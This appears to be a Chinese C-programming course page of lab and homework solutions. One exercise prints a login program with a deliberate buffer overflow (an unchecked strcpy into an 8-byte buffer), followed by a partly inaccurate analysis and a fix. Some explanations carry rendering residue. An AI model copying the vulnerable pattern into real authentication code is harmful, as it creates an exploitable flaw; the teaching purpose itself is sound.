&lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">            lowercase++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">str</span>[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="built_in">str</span>[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">str</span>[i] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            others++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%d %d %d %d&quot;</span>, uppercase, lowercase, digits, others);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy5-3">3.sy5-3</h2>
<p>打开C集成开发环境，建立一个sy5-3.cpp文件，编写一程序，功能是输入一个字符串，删除尾部连续的“*”号，前导和中间的保留。例如：</p>
<p>输入：***ab<em>c</em>12*3***<em>，输出：***ab</em>c<em>12</em>3</p>
<p>输入：**12<em>78</em>89，输出：*<em>12</em>78*89</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    char <span class="built_in">str</span>[<span class="number">100</span>]; </span><br><span class="line">    scanf(<span class="string">&quot;%s&quot;</span>, <span class="built_in">str</span>);</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">len</span> = strlen(<span class="built_in">str</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">len</span> &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">str</span>[<span class="built_in">len</span> - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">str</span>[<span class="built_in">len</span> - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>; </span><br><span class="line">        <span class="built_in">len</span>--; </span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%s&quot;</span>, <span class="built_in">str</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy5-4">4.sy5-4</h2>
<p>打开C集成开发环境，建立一个sy5-4.cpp文件，编写一程序，功能是输入一个身份证号，把身份证号的第7~14位替换成*，并把末位字母转换为大写。例如：</p>
<p>输入：35010120031005123x，输出：350101********123X。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    char <span class="built_in">id</span>[<span class="number">19</span>]; </span><br><span class="line">    scanf(<span class="string">&quot;%18s&quot;</span>, <span class="built_in">id</span>); </span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">6</span>; i &lt;= <span class="number">13</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">id</span>[i] = <span class="string">&#x27;*&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">id</span>[<span class="number">17</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; <span class="built_in">id</span>[<span class="number">17</span>] &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">id</span>[<span class="number">17</span>] -= <span class="string">&#x27;a&#x27;</span> - <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">id</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy5-5">5.sy5-5</h2>
<p>打开C集成开发环境，建立一个sy5-5.cpp文件，输入如下程序代码。</p>
<p>#include&lt;stdio.h&gt;</p>
<p>#include&lt;string.h&gt;</p>
<p>int main() {</p>
<p>​ char password[1024];</p>
<p>​ int valid;</p>
<p>​ char buffer[8];</p>
<p>​ while (1) {</p>
<p>​ printf(“请输入密码”);</p>
<p>​ scanf(“%s”, password);</p>
<p>​ valid = strcmp(password, “1234567”);</p>
<p>​ strcpy(buffer, password);</p>
<p>​ if (valid) {</p>
<p>​ printf(“登录失败”);</p>
<p>​ }</p>
<p>​ else {</p>
<p>​ printf(“登录成功”);</p>
<p>​ break;</p>
<p>​ }</p>
<p>​ }</p>
<p>​ return 0;</p>
<p>}</p>
<p>编译运行以上程序，分别输入：11111111(8位)、1234567、22222222(8位)等三个密码，观察运行情况，试分析为什么会出现这种情况，应如何避免出现类似的问题。</p>
<ol type="1">
<li><strong>缓冲区溢出（Buffer Overflow）：</strong>
<ul>
<li><code>buffer</code> 数组定义为
<code>char buffer[8];</code>，意味着它只能存储最多7个字符（因为字符串需要结尾的
<code>\0</code> 字符）。但程序允许用户输入更长的密码，并且直接将其复制到
<code>buffer</code> 中。</li>
<li>在 <code>scanf("%s", password)</code>
中，用户可以输入一个超过8个字符的密码，导致 <code>password</code>
数组中存储的字符串长度可能超过 <code>buffer</code>
的最大容量。此时，使用 <code>strcpy(buffer, password)</code>
可能会造成缓冲区溢出，从而覆盖掉 <code>buffer</code>
后面的内存数据。</li>
</ul></li>
<li><strong>密码验证逻辑不安全：</strong>
<ul>
<li><code>strcmp(password, "1234567")</code>
返回值的检查没有直接有效地验证密码的长度。如果用户输入的是一个有效密码（比如
<code>1234567</code>），程序会通过验证。但是，如果输入的密码过长，比如
<code>11111111</code>（8个字符），程序仍然会把密码复制到
<code>buffer</code> 中，导致溢出，最终可能会影响程序的行为。</li>
</ul></li>
</ol>
<h4 id="运行情况">运行情况：</h4>
<ol type="1">
<li><strong>输入：</strong> <code>11111111</code>（8位密码）
<ul>
<li>输入密码时，<code>password</code>
数组能够接收超过8个字符的输入，导致
<code>strcpy(buffer, password)</code> 发生缓冲区溢出。由于
<code>buffer</code> 只有8个字节，而 <code>password</code>
实际上是超过8个字节，导致 <code>buffer</code> 后面的内存被破坏。由于
<code>buffer</code> 被溢出，可能会导致程序的意外行为。</li>
</ul></li>
<li><strong>输入：</strong> <code>1234567</code>（正确密码）
<ul>
<li>程序正常运行，通过密码验证并输出
“登录成功”。这里没有发生缓冲区溢出。</li>
</ul></li>
<li><strong>输入：</strong> <code>22222222</code>（8位密码）
<ul>
<li>同样地，输入一个超过 <code>buffer</code>
大小的密码会导致缓冲区溢出。虽然密码是错误的，程序仍然会执行到
<code>strcpy</code>，引发潜在的内存损坏。</li>
</ul></li>
</ol>
<h3 id="解决方法"><strong>解决方法：</strong></h3>
<ol type="1">
<li><strong>防止缓冲区溢出：</strong>
<ul>
<li>在读取字符串时使用 <code>scanf("%7s", password)</code> 或
<code>fgets(password, sizeof(password), stdin)</code> 来避免超出
<code>password</code> 数组的大小。</li>
<li>使用 <code>strncpy</code> 或其他安全函数来替代
<code>strcpy</code>，以确保不会超出 <code>buffer</code> 的大小。</li>
</ul></li>
<li><strong>密码比较的安全性：</strong>
<ul>
<li>对用户输入的密码进行长度检查。如果用户输入的密码长度大于或等于
<code>buffer</code>
的大小，可以提示错误信息，并要求用户重新输入密码。</li>
<li>修改后的代码</li>
</ul></li>
</ol>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> valid;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入密码\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%7s&quot;</span>, password); </span><br><span class="line">        valid = <span class="built_in">strcmp</span>(password, <span class="string">&quot;1234567&quot;</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(buffer, password, <span class="built_in">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">        buffer[<span class="built_in">sizeof</span>(buffer) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;登录失败\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;登录成功\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="作业1024.12.3">作业10（24.12.3）</h1>
<h2 id="程序文件名zy10-1.cpp">1、【程序文件名】zy10-1.cpp</h2>
<p>【题目描述】有n个整数，使前面各数顺序向后移m个位置，最后m个数变成最前面m个
数。如有n=10个整数： 1 2 3 4 5 6 7 8 9 10
若m=4，则后面4个数移到前面，如下： 7 8 9 10 1 2 3 4 5 6 试编写一函数void
move(int a[],int n,int m)实现以上功能，在main函数中输入n个数和m
的值，调用move函数后，输出调整后的n个数，每个数间用一个空格隔开。例如：
输入：10 1 2 3 4 5 6 7 8 9 10 4 输出：7 8 9 10 1 2 3 4 5 6</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="type">void</span> <span class="keyword">move</span>(<span class="type">int</span> a[], <span class="type">int</span> n, <span class="type">int</span> m) &#123;</span><br><span class="line">    m = m % n; </span><br><span class="line">    <span class="type">int</span> <span class="keyword">temp</span>[m]; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">temp</span>[i] = a[n - m + i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= m; i<span class="comment">--) &#123;</span></span><br><span class="line">        a[i] = a[i - m];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        a[i] = <span class="keyword">temp</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main() &#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;n);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> a[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;m);</span><br><span class="line">    <span class="keyword">move</span>(a, n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        printf(&quot;%d &quot;, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy10-2.cpp">2、程序文件名】zy10-2.cpp</h2>
<p>【题目描述】试编写一个摆花函数void flower(char f[][N],int
n)，函数的功能描述：同学们弄
来了不多于26种花，每种花有多盆。为使有限的鲜花摆放得更美观，同学们决定把花摆成
正方形图案，现在告诉你正方形的边长N（每盆花的直径为一个单位长，1&lt;=N&lt;=99，N为
奇数），请你编程输出花所排成正方形图案（用大写字母代表花）。我们把图案的中心称为第
1圈，中心向外依次是第2圈、第3圈……。中心是字母A，第2圈是字母B，第3圈是字母
C，……，第26圈是字母Z，第27圈又是字母A，第28圈又是字母B，……Z，A，B……。在
main函数中，输入n，调用flower函数后，输出图案，提醒：输出时每个字母前有一个空
格。 例如： 输入：15 则输出以下图案（输出时每个字母前留一个空格）： H H
H H H H H H H H H H H H H H G G G G G G G G G G G G G H H G F F F F F F
F F F F F G H H G F E E E E E E E E E F G H H G F E D D D D D D D E F G
H H G F E D C C C C C D E F G H H G F E D C B B B C D E F G H H G F E D
C B A B C D E F G H H G F E D C B B B C D E F G H H G F E D C C C C C D
E F G H H G F E D D D D D D D E F G H H G F E E E E E E E E E F G H H G
F F F F F F F F F F F G H H G G G G G G G G G G G G G H H H H H H H H H
H H H H H H H</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define <span class="built_in">N</span> <span class="number">99</span> </span><br><span class="line">void flower(<span class="built_in">char</span> f[][<span class="built_in">N</span>], <span class="built_in">int</span> <span class="built_in">n</span>) &#123;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">mid</span> = <span class="built_in">n</span> / <span class="number">2</span>;  </span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">n</span>; i++) &#123;</span><br><span class="line">        for (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">n</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">int</span> layer = (i &lt; <span class="built_in">mid</span> ? <span class="built_in">mid</span> - i <span class="symbol">:</span> i - <span class="built_in">mid</span>) &gt; (j &lt; <span class="built_in">mid</span> ? <span class="built_in">mid</span> - j <span class="symbol">:</span> j - <span class="built_in">mid</span>) ?</span><br><span class="line">                        (i &lt; <span class="built_in">mid</span> ? <span class="built_in">mid</span> - i <span class="symbol">:</span> i - <span class="built_in">mid</span>) <span class="symbol">:</span> (j &lt; <span class="built_in">mid</span> ? <span class="built_in">mid</span> - j <span class="symbol">:</span> j - <span class="built_in">mid</span>);</span><br><span class="line">            <span class="built_in">char</span> ch = &#x27;A&#x27; + layer % <span class="number">26</span>; </span><br><span class="line">            f[i][j] = ch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">n</span>;</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="built_in">n</span>); </span><br><span class="line">    <span class="built_in">char</span> f[<span class="built_in">N</span>][<span class="built_in">N</span>];</span><br><span class="line">    flower(f, <span class="built_in">n</span>);</span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">n</span>; i++) &#123;</span><br><span class="line">        for (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">n</span>; j++) &#123;</span><br><span class="line">            printf(<span class="string">&quot; %c&quot;</span>, f[i][j]); </span><br><span class="line">        &#125;</span><br><span class="line">        printf(<span class="string">&quot;\n&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="程序文件名zy10-3.cpp">3、程序文件名】zy10-3.cpp</h2>
<p>【题目描述】输入以下代码，分析程序运行结果，应如何改进宏定义避免出现歧义。请完善
程序，输出没有歧义的数据。输出：S=314.15900
注意：宏预处理只是简单的替换。 #include #define M 2 #define N M+3
#define R M<em>N #define PI 3.14159 #define S(r) PI</em>r*r int main() {
printf(“S=%.5f”,S(R)); }</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N (M + 3)     </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R (M * N)     </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S(r) (PI * (r) * (r))  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S=%.5f\n&quot;</span>, <span class="built_in">S</span>(R)); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>宏的替换规则</strong>：宏在预处理阶段是直接文本替换，没有语法检查或解析。</p>
<p><strong>代码中的宏展开</strong>：</p>
<ul>
<li><p><code>M</code> 被替换为 <code>2</code>。</p></li>
<li><p><code>N</code> 被替换为 <code>M + 3</code>，即替换为
<code>2 + 3</code>。</p></li>
<li><p><code>R</code> 被替换为 <code>M * N</code>，展开为
<code>2 * 2 + 3</code>。</p></li>
<li><p>因为宏替换没有括号，<code>R</code> 变为
<code>2 * 2 + 3 = 4 + 3 = 7</code>，而不是期望的
<code>2 * (2 + 3) = 10</code>。</p></li>
<li><p>最终 <code>S(R)</code> 被替换为 <code>PI * R * R</code>，展开后是
<code>PI * 7 * 7</code>。</p></li>
<li><h4 id="结果">结果：</h4>
<p>当前程序运行结果是：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">makefile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line"><span class="attribute">S</span><span class="operator">=</span><span class="number">153.93791</span></span><br></pre></td></tr></table></figure>
<p>显然这并非期望值。</p>
<hr />
<h3 id="如何避免歧义">如何避免歧义</h3>
<ol type="1">
<li><p><strong>为宏参数加括号</strong>：确保替换时不改变原始表达式的优先级。</p></li>
<li><p><strong>为宏定义加括号</strong>：避免操作符优先级的混淆。</p></li>
<li><h3 id="改进后的代码">改进后的代码</h3>
<p>以下是改进后的代码，确保宏定义没有歧义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">c复制代码<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N (M + 3)      <span class="comment">// 用括号包裹，防止优先级混淆</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R (M * N)      <span class="comment">// 同样用括号，确保优先级正确</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.14159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> S(r) (PI * (r) * (r))  <span class="comment">// 为参数和整体表达式加括号</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;S=%.5f\n&quot;</span>, <span class="built_in">S</span>(R)); <span class="comment">// S = PI * R * R</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="修改后的宏展开过程">修改后的宏展开过程</h3>
<ol type="1">
<li><code>M = 2</code>。</li>
<li><code>N = (M + 3)</code>，展开为 <code>(2 + 3)</code>。</li>
<li><code>R = (M * N)</code>，展开为
<code>(2 * (2 + 3)) = 10</code>。</li>
<li><code>S(r) = (PI * (r) * (r))</code>，替换 <code>R</code> 后展开为
<code>(PI * 10 * 10)</code>。</li>
<li>最终计算结果： S=π⋅10⋅10=314.15900S = =
314.15900S=π⋅10⋅10=314.15900</li>
</ol>
<hr />
<h3 id="输出结果">输出结果</h3>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">makefile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制代码</span><br><span class="line"><span class="attribute">S</span><span class="operator">=</span><span class="number">314.15900</span></span><br></pre></td></tr></table></figure>
<h3 id="总结">总结</h3>
<p>宏替换容易因为缺少括号引发歧义。<strong>最佳实践</strong>是：</p>
<ol type="1">
<li><strong>为宏定义中的每个表达式添加括号</strong>。</li>
<li><strong>为宏函数的参数加括号</strong>，以防止优先级问题。</li>
</ol>
<h1 id="实验六24.12.6">实验六（24.12.6）</h1>
<h2 id="sy6-1">sy6-1</h2>
<p>打开C集成开发环境，建立一个sy6-1.cpp文件，编写一函数int swap(int
x,int
y)，功能是交换两个数并返回两数之和。在main函数中输入两个数x和y，调用swap函数后，输出交换后的两个数x、y以及两数之和（每个数后留一个空格）。例如：</p>
<p>输入：3 5</p>
<p>输出：5 3 8</p>
<p>输入：8 3</p>
<p>输出：3 8 11</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> *x, <span class="type">int</span> *y)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> temp = *x;</span><br><span class="line">    *x = *y;</span><br><span class="line">    *y = temp;</span><br><span class="line">    <span class="keyword">return</span> *x + *y; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x, y, sum;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">    sum = <span class="built_in">swap</span>(&amp;x, &amp;y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, x, y, sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy6-2">sy6-2</h2>
<p>打开C集成开发环境，建立一个sy6-2.cpp文件，编写一函数void radix(int
x，int
d)，功能是使用递归调用方法将十进制数x转化为d（如2、8）进制并输出。在main函数中输入正整数x和d（2或8）后调用radix函数。</p>
<p>输入：23 2</p>
<p>输出：10111</p>
<p>输入：31 8</p>
<p>输出：37</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">radix</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">radix</span>(x / d, d); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, x % d);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x, d;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;x, &amp;d);</span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0\n&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">radix</span>(x, d);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="sy6-3">sy6-3</h2>
<p>打开C集成开发环境，建立一个sy6-3.cpp文件，编写两个函数void sort(int
a[],int n)和int search(int a[],int n,int
x)，其中sort功能是对传入的n个数进行升序排序；search功能是使用折半查找法（即二分法）在一组有序（升序）的n个数中查找指定数x，若找到，返回x在该组数中的位置（下标+1），若没找到，则返回-1。在main函数中输入n及n个数，调用sort函数后输出；再输入一个数x，调用search函数后，输出查找结果，若找到输出位置（如：Position:3），若没有找到，则输出：No
find。注意：输出时英文大小写，以及Position后的冒号为英文格式。例如：</p>
<p>输入：10</p>
<p>21 34 5 22 43 65 78 31 65 9</p>
<p>输出：5 9 21 22 31 34 43 65 65 78</p>
<p>输入：34</p>
<p>输出：Position:6</p>
<p>再如：</p>
<p>输入：8</p>
<p>23 45 21 54 78 54 31 17</p>
<p>输出：17 21 23 31 45 54 54 78</p>
<p>输入：19</p>
<p>输出：No find</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void sort(<span class="built_in">int</span> a[], <span class="built_in">int</span> <span class="built_in">n</span>) &#123;</span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">n</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        for (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">n</span> - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">            <span class="built_in">if</span> (a[j] &gt; a[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="built_in">int</span> temp = a[j];</span><br><span class="line">                a[j] = a[j + <span class="number">1</span>];</span><br><span class="line">                a[j + <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> <span class="built_in">search</span>(<span class="built_in">int</span> a[], <span class="built_in">int</span> <span class="built_in">n</span>, <span class="built_in">int</span> x) &#123;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">left</span> = <span class="number">0</span>, <span class="built_in">right</span> = <span class="built_in">n</span> - <span class="number">1</span>;</span><br><span class="line">    while (<span class="built_in">left</span> &lt;= <span class="built_in">right</span>) &#123;</span><br><span class="line">        <span class="built_in">int</span> <span class="built_in">mid</span> = (<span class="built_in">left</span> + <span class="built_in">right</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">if</span> (a[<span class="built_in">mid</span>] == x) return <span class="built_in">mid</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">if</span> (a[<span class="built_in">mid</span>] &lt; x) <span class="built_in">left</span> = <span class="built_in">mid</span> + <span class="number">1</span>;</span><br><span class="line">        else <span class="built_in">right</span> = <span class="built_in">mid</span> - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    return -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">    <span class="built_in">int</span> <span class="built_in">n</span>, x;</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="built_in">n</span>);</span><br><span class="line">    <span class="built_in">int</span> a[<span class="built_in">n</span>];</span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">n</span>; i++) scanf(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    sort(a, <span class="built_in">n</span>); </span><br><span class="line">    for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">n</span>; i++) printf(<span class="string">&quot;%d &quot;</span>, a[i]); </span><br><span class="line">    printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    <span class="built_in">int</span> pos = <span class="built_in">search</span>(a, <span class="built_in">n</span>, x); </span><br><span class="line">    <span class="built_in">if</span> (pos != -<span class="number">1</span>) printf(<span class="string">&quot;Position:%d\n&quot;</span>, pos);</span><br><span class="line">    else printf(<span class="string">&quot;No find\n&quot;</span>);</span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="sy6-4">sy6-4</h2>
<p>打开C集成开发环境，建立一个sy6-4.cpp文件，编写一函数void encrypt(char
s[],int
d)，功能是将字符串中的每个字母用其之后（或之前）的第d个字母替换，如：d=4，则：AàE，BàF，…，WàA，XàB，aàe，bàf，…，wàa，xàb；如：d=-4，则：AàW，BàX，…，aàw，bàx，…，其他字符不变。在main函数中输入一个字符串s和d，调用encrypt(s,d)后，输出s，执行d=-d后再次调用encrypt(s,d)后，输出s。例如：</p>
<p>输入：Windows</p>
<p>4</p>
<p>输出：Amrhsaw</p>
<p>Windows</p>
